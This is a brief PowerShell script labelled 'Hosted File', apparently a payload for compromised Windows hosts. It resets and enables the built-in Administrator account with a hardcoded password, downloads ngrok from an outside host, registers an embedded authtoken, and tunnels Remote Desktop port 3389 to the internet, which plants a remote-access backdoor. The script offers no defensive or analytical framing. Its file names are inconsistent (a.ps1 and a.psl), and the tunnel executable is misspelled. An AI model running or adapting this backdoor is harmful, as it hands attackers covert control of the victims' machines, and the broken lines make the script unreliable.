Hosted File: 
Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "@rdobyav321" -Force) 
Get-LocalUser -Name "Administrator" | Enable-LocalUser 
Invoke-WebRequest https://bin.equinox.io/c/4VmOzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip 
tar xf ngrok.zip 
Copy ngrok.exe C:\Windows\System32 
cmd /c echo ./ngrok.exe add-authtoken "2EcctVcctWZZoT00U0K5JggZ4ht_5LQR8JJnmESozLBjZDwLi" >a.ps1
cmd /c echo cmd /k start ngrox.exe tcp 3389 >>a.psl 
cmd /c echo ping -n 999999 10.10.10.10 >>a.psl
.\a.ps1
